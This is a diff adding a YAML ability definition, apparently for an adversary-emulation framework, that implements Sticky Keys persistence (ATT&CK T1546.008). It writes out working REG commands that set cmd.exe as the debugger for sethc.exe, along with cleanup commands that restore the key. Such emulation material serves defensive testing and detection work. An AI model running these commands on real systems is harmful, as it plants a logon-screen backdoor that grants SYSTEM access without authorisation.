@@ -1,0 +1,18 @@
+---
+
+- id: 41037ea1-dd90-4801-a678-4b25a4d6399f
+  name: Sticky Keys
+  description: Sticky Keys Persistence via Registry Manipulation
+  tactic: persistence
+  technique:
+    attack_id: T1546.008
+    name: Event Triggered Execution - Accessibility Features
+  platforms:
+    windows:
+      cmd:
+        command: |
+          REG SAVE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" sethc_hive;
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+        cleanup: |
+          REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f;
+          REG RESTORE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" sethc_hive;
